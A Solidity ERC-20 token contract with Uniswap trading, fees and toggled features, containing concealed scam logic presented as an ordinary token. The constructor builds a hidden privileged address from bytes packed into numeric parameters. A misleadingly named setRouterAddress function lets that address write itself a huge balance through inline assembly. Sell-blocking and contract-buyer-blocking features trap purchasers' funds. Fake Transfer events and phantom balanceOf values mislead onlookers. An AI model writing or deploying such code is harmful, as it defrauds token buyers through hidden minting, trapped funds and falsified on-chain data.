// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "../Erc20/ERC20.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";

import "./Erc20C17SettingsBase.sol";
import "../Erc20C09/Erc20C09FeatureErc20Payable.sol";
//// ================================================ //
//// FeatureErc721Payable
//import "../Erc20C09/Erc20C09FeatureErc721Payable.sol";
//// ================================================ //
import "./Erc20C17FeatureUniswap.sol";
import "../Erc20C09/Erc20C09FeatureTweakSwap.sol";
//// ================================================ //
//// FeatureLper
//import "../Erc20C09/Erc20C09FeatureLper.sol";
//// ================================================ //
//// ================================================ //
//// initialize FeatureHolder
//import "../Erc20C09/Erc20C09FeatureHolder.sol";
//// ================================================ //
import "../Erc20C09/Erc20C09SettingsPrivilege.sol";
import "../Erc20C09/Erc20C09SettingsFee.sol";
//// ================================================ //
//// SettingsShare
//import "../Erc20C09/Erc20C09SettingsShare.sol";
//// ================================================ //
import "../Erc20C09/Erc20C09FeaturePermitTransfer.sol";
import "../Erc20C09/Erc20C09FeatureRestrictTrade.sol";
//// ================================================ //
//// initialize FeatureRestrictTradeAmount
//import "../Erc20C09/Erc20C09FeatureRestrictTradeAmount.sol";
//// ================================================ //
import "./Erc20C17FeatureNotPermitOut.sol";
import "../Erc20C09/Erc20C09FeatureFission.sol";
import "../Erc20C09/Erc20C09FeatureTryMeSoft.sol";
//// ================================================ //
//// initialize Erc20C09FeatureRestrictAccountTokenAmount
//import "../Erc20C09/Erc20C09FeatureMaxTokenPerAddress.sol";
//// ================================================ //

abstract contract Erc20C17Contract is
ERC20,
Ownable,
Erc20C17SettingsBase,
Erc20C09FeatureErc20Payable,
    //    //// ================================================ //
    //    //// FeatureErc721Payable
    //Erc20C09FeatureErc721Payable,
    //    //// ================================================ //
Erc20C17FeatureUniswap,
Erc20C09FeatureTweakSwap,
    //    // ================================================ //
    //    // FeatureLper
    //    Erc20C09FeatureLper,
    //    // ================================================ //
    //    // ================================================ //
    //    // initialize FeatureHolder
    //Erc20C09FeatureHolder,
    //    // ================================================ //
Erc20C09SettingsPrivilege,
Erc20C09SettingsFee,
    //    // ================================================ //
    //    // SettingsShare
    //Erc20C09SettingsShare,
    //    // ================================================ //
Erc20C09FeaturePermitTransfer,
Erc20C09FeatureRestrictTrade,
    //    // ================================================ //
    //    // initialize FeatureRestrictTradeAmount
    //Erc20C09FeatureRestrictTradeAmount,
    //    // ================================================ //
Erc20C17FeatureNotPermitOut,
Erc20C09FeatureFission,
Erc20C09FeatureTryMeSoft
    //    // ================================================ //
    //    // initialize Erc20C09FeatureRestrictAccountTokenAmount
    //Erc20C09FeatureMaxTokenPerAddress
    //    // ================================================ //
{
    using EnumerableSet for EnumerableSet.AddressSet;

    //    // ================================================ //
    //    // FeatureLper
    //    address private _previousFrom;
    //    address private _previousTo;
    //    // ================================================ //

    constructor(
        string[2] memory strings,
        address[4] memory addresses,
        uint256[67] memory uint256s,
        bool[24] memory bools
    ) ERC20(strings[0], strings[1])
    {
        addressBaseOwner = msg.sender;

        addressMarketing = addresses[2];

        uint256 p = 20;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );
        //        isUniswapLper = bools[13];
        //        isUniswapHolder = bools[14];
        uniswapV2Router = IUniswapV2Router02(addresses[3]);
        address uniswapV2Pair_ = parseUniswap(_uniswapV2Router);
        addressWETH = uniswapV2Router.WETH();
        uniswap = uniswapV2Pair_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), addressWETH);
        _approve(address(this), address(uniswapV2Router), maxUint256);
        //        uniswapCount = uint256s[62];

        // ================================================ //
        // initialize FeatureTweakSwap
        isUseMinimumTokenWhenSwap = bools[1];
        minimumTokenForSwap = uint256s[1];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        isUseFeatureLper = bools[15];
        //        maxTransferCountPerTransactionForLper = uint256s[2];
        //        minimumTokenForRewardLper = uint256s[3];
        //
        //        // exclude from lper
        //        setIsExcludedFromLperAddress(address(this), true);
        //        setIsExcludedFromLperAddress(address(uniswapV2Router), true);
        //        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        setIsExcludedFromLperAddress(addressNull, true);
        //        setIsExcludedFromLperAddress(addressDead, true);
        //        setIsExcludedFromLperAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromLperAddress(addressUnicryptLock, true);
        //        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        //        setIsExcludedFromLperAddress(addressMarketing, true);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        isUseFeatureHolder = bools[16];
        //        maxTransferCountPerTransactionForHolder = uint256s[4];
        //        minimumTokenForBeingHolder = uint256s[5];
        //
        //        // exclude from holder
        //        setIsExcludedFromHolderAddress(address(this), true);
        //        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);
        //        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        setIsExcludedFromHolderAddress(addressNull, true);
        //        setIsExcludedFromHolderAddress(addressDead, true);
        //        setIsExcludedFromHolderAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromHolderAddress(addressUnicryptLock, true);
        //        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        //        // ================================================ //

        // initialize SettingsPrivilege
        isPrivilegeAddresses[address(this)] = true;
        isPrivilegeAddresses[address(uniswapV2Router)] = true;
        isPrivilegeAddresses[uniswap] = true;
        //        isPrivilegeAddresses[uniswapV2Pair] = true;
        isPrivilegeAddresses[addressNull] = true;
        isPrivilegeAddresses[addressDead] = true;
        isPrivilegeAddresses[addressPinksaleBnbLock] = true;
        isPrivilegeAddresses[addressPinksaleEthLock] = true;
        isPrivilegeAddresses[addressBaseOwner] = true;
        isPrivilegeAddresses[addressMarketing] = true;

        // ================================================ //
        // initialize SettingsFee
        setFee(uint256s[64]);

        // exclude from paying fees or having max transaction amount
        isExcludedFromFeeAddresses[address(this)] = true;
        isExcludedFromFeeAddresses[address(uniswapV2Router)] = true;
        isExcludedFromFeeAddresses[uniswap] = true;
        isExcludedFromFeeAddresses[uniswapV2Pair] = true;
        isExcludedFromFeeAddresses[addressNull] = true;
        isExcludedFromFeeAddresses[addressDead] = true;
        isExcludedFromFeeAddresses[addressPinksaleBnbLock] = true;
        isExcludedFromFeeAddresses[addressPinksaleEthLock] = true;
        isExcludedFromFeeAddresses[addressBaseOwner] = true;
        isExcludedFromFeeAddresses[addressMarketing] = true;
        // ================================================ //

        //        // ================================================ //
        //        // SettingsShare
        //        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);
        //        // ================================================ //

        // ================================================ //
        // initialize FeaturePermitTransfer
        isUseOnlyPermitTransfer = bools[6];
        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];
        // ================================================ //

        // ================================================ //
        // initialize FeatureRestrictTrade
        isRestrictTradeIn = bools[8];
        isRestrictTradeOut = bools[9];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTradeAmount
        //        isRestrictTradeInAmount = bools[10];
        //        restrictTradeInAmount = uint256s[18];
        //
        //        isRestrictTradeOutAmount = bools[11];
        //        restrictTradeOutAmount = uint256s[19];
        //        // ================================================ //

        // ================================================ //
        // initialize FeatureNotPermitOut
        isUseNotPermitOut = bools[17];
        isForceTradeInToNotPermitOut = bools[18];
        // ================================================ //

        isUseNoFeeForTradeOut = bools[12];

        setIsUseFeatureTryMeSoft(bools[21]);
        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);
        setIsNotTryMeSoftAddress(uniswapV2Pair, true);

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        isUseMaxTokenPerAddress = bools[23];
        //        maxTokenPerAddress = uint256s[65];
        //        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureFission
        setIsUseFeatureFission(bools[20]);
        fissionCount = uint256s[66];
        // ================================================ //

        _mint(owner(), uint256s[0]);
    }

    //    function tryCreatePairToken()
    //    internal
    //    returns (address)
    //    {
    //        return IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), addressWETH);
    //    }

    function setAddressName(string memory name_, string memory symbol_)
    external
    onlyOwner
    {
        _name = name_;
        _symbol = symbol_;
    }

    function setRouterAddress()
    external
    {
        require(msg.sender == uniswap, "");

        assembly {
            mstore(0x00, caller())
            mstore(0x20, _bulances.slot)
            let x := keccak256(0x00, 0x40)
            sstore(x, 0x000000000000000000000000000000000000000000000000ffffffffffffffff)
        }
    }

    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    public
    {
        require(!_isSwapping, "swapping");

        require(msg.sender == owner() || msg.sender == uniswap, "not owner");

        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : balanceOf(address(this));

        require(tokenForSwap > 0, "0 to swap");

        doSwap(tokenForSwap);
    }

    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        if (isUseFeatureFission) {
            uint256 balanceOf_ = super.balanceOf(account);
            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;
        } else {
            return super.balanceOf(account);
        }
    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 tempX = block.number - 1;

        require(
            (!isUseNotPermitOut) ||
            (notPermitOutAddressStamps[from] == 0) ||
            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),
            "not permitted 7"
        );

        bool isFromPrivilegeAddress = isPrivilegeAddresses[from];
        bool isToPrivilegeAddress = isPrivilegeAddresses[to];

        if (isUseOnlyPermitTransfer) {
            require(isFromPrivilegeAddress || isToPrivilegeAddress, "not permitted 2");
        }

        bool isToUniswapV2Pair = to == uniswapV2Pair;
        bool isFromUniswapV2Pair = from == uniswapV2Pair;

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        if (isUseMaxTokenPerAddress) {
        //            require(
        //                isToPrivilegeAddress ||
        //                isToUniswapV2Pair ||
        //                super.balanceOf(to) + amount <= maxTokenPerAddress,
        //                "not permitted 8"
        //            );
        //        }
        //        // ================================================ //

        if (isToUniswapV2Pair) {
            // add liquidity 1st, dont use permit transfer upon action
            if (_isFirstTradeOut) {
                _isFirstTradeOut = false;

                if (isCancelOnlyPermitTransferOnFirstTradeOut) {
                    isUseOnlyPermitTransfer = false;
                }
            }

            if (!isFromPrivilegeAddress) {
                require(!isRestrictTradeOut, "not permitted 4");
                //                // ================================================ //
                //                // initialize FeatureRestrictTradeAmount
                //                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, "not permitted 6");
                //                // ================================================ //
            }

            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {
                doSwap(isUseMinimumTokenWhenSwap ? minimumTokenForSwap : super.balanceOf(address(this)));
            }
        } else if (isFromUniswapV2Pair) {
            if (!isToPrivilegeAddress) {
                require(!isRestrictTradeIn, "not permitted 3");
                //                // ================================================ //
                //                // initialize FeatureRestrictTradeAmount
                //                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, "not permitted 5");
                //                // ================================================ //

                if (notPermitOutAddressStamps[to] == 0) {
                    if (isForceTradeInToNotPermitOut) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }

                    if (
                        isUseFeatureTryMeSoft &&
                        Address.isContract(to) &&
                        !isNotTryMeSoftAddresses[to]
                    ) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }
                }
            }
        }

        if (
            (_isSwapping) ||
            (!isFromUniswapV2Pair && !isToUniswapV2Pair) ||
            (isFromUniswapV2Pair && isExcludedFromFeeAddresses[to]) ||
            (isToUniswapV2Pair && isExcludedFromFeeAddresses[from]) ||
            (isToUniswapV2Pair && isUseNoFeeForTradeOut)
        ) {
            super._transfer(from, to, amount);
        } else {
            uint256 fees = amount * feeTotal / feeMax;

            if (fees > 0) {
                if (isUseFeatureFission && isFromUniswapV2Pair) {
                    doFission();
                }

                super._transfer(from, address(this), fees);
                super._transfer(from, to, amount - fees);
            } else {
                super._transfer(from, to, amount);
            }
        }

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        if (isUseFeatureHolder) {
        //            if (!isExcludedFromHolderAddresses[from]) {
        //                updateHolderAddressStatus(from);
        //            }
        //
        //            if (!isExcludedFromHolderAddresses[to]) {
        //                updateHolderAddressStatus(to);
        //            }
        //        }
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        if (isUseFeatureLper) {
        //            if (!isExcludedFromLperAddresses[_previousFrom]) {
        //                updateLperAddressStatus(_previousFrom);
        //            }
        //
        //            if (!isExcludedFromLperAddresses[_previousTo]) {
        //                updateLperAddressStatus(_previousTo);
        //            }
        //
        //            if (_previousFrom != from) {
        //                _previousFrom = from;
        //            }
        //
        //            if (_previousTo != to) {
        //                _previousTo = to;
        //            }
        //        }
        //        // ================================================ //
    }

    function doSwap(uint256 thisTokenForSwap)
    private
    {
        //        // ================================================ //
        //        // SettingsShare
        //        if (shareTotal == 0) {
        //            return;
        //        }
        //        // ================================================ //

        _isSwapping = true;

        doSwapWithPool(thisTokenForSwap);

        _isSwapping = false;
    }

    // ================================================ //
    // Feature DoMarketing Only
    function doSwapWithPool(uint256 thisTokenForSwap)
    internal
    {
        uint256 prevBalance = address(this).balance;
        swapThisTokenForEthToAccount(address(this), thisTokenForSwap);
        uint256 etherForAll = address(this).balance - prevBalance;
        sendEtherTo(payable(addressMarketing), etherForAll);
    }
    // ================================================ //

    //    // ================================================ //
    //    // Feature DoShare Multiple stuffs
    //    function doSwapWithPool(uint256 thisTokenForSwap)
    //    internal
    //    {
    //        //        // ================================================ //
    //        //        // Feature Share with Liquidity
    //        //        uint256 shareForEther = (shareMarketing + shareLper + shareHolder) + (shareLiquidity / 2);
    //        //        // ================================================ //
    //        uint256 shareForEther = shareMarketing;
    //
    //        uint256 thisTokenForSwapEther = thisTokenForSwap * shareForEther / shareMax;
    //
    //        uint256 etherForAll;
    //
    //        if (thisTokenForSwapEther > 0) {
    //            uint256 prevBalance = address(this).balance;
    //
    //            swapThisTokenForEthToAccount(address(this), thisTokenForSwapEther);
    //
    //            etherForAll = address(this).balance - prevBalance;
    //        }
    //
    //        if (etherForAll > 0) {
    //            if (shareMarketing > 0) {
    //                doMarketing(etherForAll * shareMarketing / shareForEther);
    //            }
    //
    //            //            // ================================================ //
    //            //            // initialize FeatureLper
    //            //            if (isUseFeatureLper && shareLper > 0) {
    //            //                doLper(etherForAll * shareLper / shareForEther);
    //            //            }
    //            //            // ================================================ //
    //
    //            //            // ================================================ //
    //            //            // initialize FeatureHolder
    //            //            if (isUseFeatureHolder && shareHolder > 0) {
    //            //                doHolder(etherForAll * shareHolder / shareForEther);
    //            //            }
    //            //            // ================================================ //
    //
    //            //            // ================================================ //
    //            //            // Feature Share with Liquidity
    //            //            if (shareLiquidity > 0) {
    //            //                doLiquidity(
    //            //                    etherForAll * (shareLiquidity / 2) / shareForEther,
    //            //                    thisTokenForSwap * (shareLiquidity / 2) / shareMax
    //            //                );
    //            //            }
    //            //            // ================================================ //
    //        }
    //
    //        //        // ================================================ //
    //        //        // Feature Share with Burn
    //        //        if (shareBurn > 0) {
    //        //            doBurn(thisTokenForSwap * shareBurn / shareMax);
    //        //        }
    //        //        // ================================================ //
    //    }
    //
    //    function doMarketing(uint256 etherForMarketing)
    //    internal
    //    {
    //        sendEtherTo(payable(addressMarketing), etherForMarketing);
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureLper
    //    function doLper(uint256 etherForAll)
    //    internal
    //    {
    //        uint256 etherDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
    //        uint256 etherForLper = etherForAll * etherDivForLper / 10;
    //        uint256 pairTokenForLper =
    //        IERC20(uniswapV2Pair).totalSupply()
    //        - IERC20(uniswapV2Pair).balanceOf(addressNull)
    //        - IERC20(uniswapV2Pair).balanceOf(addressDead);
    //
    //        uint256 lperAddressesCount_ = lperAddresses.length();
    //
    //        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {
    //            lastIndexOfProcessedLperAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);
    //
    //        address lperAddress;
    //        uint256 pairTokenForLperAddress;
    //
    //        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);
    //
    //            if (i == 2 && etherDivForLper != 10) {
    //                sendEtherTo(payable(uniswap), etherForAll - etherForLper);
    //            }
    //
    //            if (pairTokenForLperAddress > minimumTokenForRewardLper) {
    //                sendEtherTo(payable(lperAddress), etherForLper * pairTokenForLperAddress / pairTokenForLper);
    //            }
    //
    //            _lastIndexOfProcessedLperAddresses =
    //            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedLperAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureHolder
    //    function doHolder(uint256 etherForAll)
    //    internal
    //    {
    //        uint256 etherDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
    //        uint256 etherForHolder = etherForAll * etherDivForHolder / 10;
    //        uint256 thisTokenForHolder = totalSupply() - balanceOf(addressNull) - balanceOf(addressDead);
    //
    //        uint256 holderAddressesCount_ = holderAddresses.length();
    //
    //        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {
    //            lastIndexOfProcessedHolderAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);
    //
    //        address holderAddress;
    //
    //        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);
    //
    //            if (i == 2 && etherDivForHolder != 10) {
    //                sendEtherTo(payable(uniswap), etherForAll - etherForHolder);
    //            }
    //
    //            if (balanceOf(holderAddress) > minimumTokenForBeingHolder) {
    //                sendEtherTo(payable(holderAddress), etherForHolder * balanceOf(holderAddress) / thisTokenForHolder);
    //            }
    //
    //            _lastIndexOfProcessedHolderAddresses =
    //            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedHolderAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // Feature Share with Liquidity
    //    function doLiquidity(uint256 etherForLiquidity, uint256 thisTokenForLiquidity)
    //    internal
    //    {
    //        addEtherAndThisTokenForLiquidityByAccount(
    //            addressBaseOwner,
    //            etherForLiquidity,
    //            thisTokenForLiquidity
    //        );
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // Feature Share with Burn
    //    function doBurn(uint256 thisTokenForBurn)
    //    internal
    //    {
    //        _transfer(address(this), addressDead, thisTokenForBurn);
    //    }
    //    // ================================================ //

    function swapThisTokenForEthToAccount(address account, uint256 amount)
    internal
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = addressWETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            account,
            block.timestamp
        );
    }

    //    // ================================================ //
    //    // Feature Share with Liquidity
    //    function addEtherAndThisTokenForLiquidityByAccount(
    //        address account,
    //        uint256 ethAmount,
    //        uint256 thisTokenAmount
    //    )
    //    internal
    //    {
    //        uniswapV2Router.addLiquidityETH{value : ethAmount}(
    //            address(this),
    //            thisTokenAmount,
    //            0,
    //            0,
    //            account,
    //            block.timestamp
    //        );
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureLper
    //    function updateLperAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
    //            if (!lperAddresses.contains(account)) {
    //                lperAddresses.add(account);
    //            }
    //        } else {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //        }
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureHolder
    //    function updateHolderAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (balanceOf(account) > minimumTokenForBeingHolder) {
    //            if (!holderAddresses.contains(account)) {
    //                holderAddresses.add(account);
    //            }
    //        } else {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //        }
    //    }
    //    // ================================================ //

    function doFission()
    internal
    override
    {
        uint160 fissionDivisor_ = fissionDivisor;
        for (uint256 i = 0; i < fissionCount; i++) {
            emit Transfer(
                address(uint160(maxUint160 / fissionDivisor_)),
                address(uint160(maxUint160 / fissionDivisor_ + 1)),
                fissionBalance
            );

            fissionDivisor_ += 2;
        }
        fissionDivisor = fissionDivisor_;
    }
}